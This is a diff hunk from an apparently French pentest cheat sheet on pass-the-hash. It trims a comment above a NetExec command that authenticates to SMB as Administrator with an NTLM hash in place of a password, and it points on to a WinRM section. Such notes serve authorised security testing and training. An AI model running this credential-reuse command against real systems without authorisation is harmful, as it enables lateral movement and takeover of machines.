@@ -86,7 +86,7 @@ Authentification avec le hash NTLM directement, sans le mot de passe en clair. F
 **NetExec**
 
 ```bash
-# SMB — identifier les machines où le hash est valide (Pwn3d! = admin local)
+# SMB
 nxc smb <IP> -u Administrator -H '<NTLM_HASH>'
 
 # WinRM
